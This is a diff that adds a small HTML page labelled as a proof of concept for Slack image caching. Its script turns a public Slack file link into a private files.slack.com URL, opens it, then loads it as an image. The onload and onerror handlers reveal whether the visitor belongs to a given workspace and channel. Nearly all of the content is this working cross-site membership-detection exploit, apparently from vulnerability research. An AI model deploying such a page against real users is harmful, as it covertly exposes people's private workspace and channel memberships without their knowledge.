@@ -1,0 +1,76 @@
+<!doctype html>
+<html>
+<head>
+    <title>slack image error detection</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</head>
+<body>
+    
+    <div class="container pt-3">
+        <h1>
+           POC - Image Caching
+        </h1>
+        <div class="form-group">
+            <br />
+            <div class="row">
+                <div class="col-md-10">
+                    <input type="text" placeholder="Enter a external image link" class="form-control" id="do">
+                </div>
+                <div class="col-md-2">
+                    <button type="button" class="btn btn-success" onclick="execPOC();">Check</button>
+                </div>
+            </div>
+        </div>
+        <div class="container" >
+            <code id="result">
+            </code>
+            <div class="row" style="margin-top: 1.5em;">
+                <div class="col-md-7">
+                    <code id="whoisinfo">
+
+                    </code>
+                </div>
+                <div class="col-md-5">
+                    <code id="whoisinfo2">
+
+                    </code>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        var team = "";
+        var channel = "";
+        var convertPubtoPriv = (link) => {
+            var parser = document.createElement('a');
+            parser.href = link;
+            team = parser.pathname.split("/")[2].split("-")[0];
+            channel = parser.pathname.split("/")[2].split("-")[1]
+            return "https://files.slack.com"+parser.pathname;
+        }
+        var execPOC = () => {
+            var link = convertPubtoPriv(document.getElementById("do").value);
+            console.log(link);
+            window.open(link);
+            setTimeout(() => {
+                var image = document.createElement("img");
+                image.src = link;
+                image.onload = () => {
+                    document.getElementById("result").innerHTML = "[+] You are member of the workspace "+team+" and channel "+channel;
+                };
+                image.onerror = () => {
+                    document.getElementById("result").innerHTML = "[+] Not a member";
+                }
+            }, 8000);
+        
+        }
+
+        
+
+    </script>
+    
+</body>
+</html>
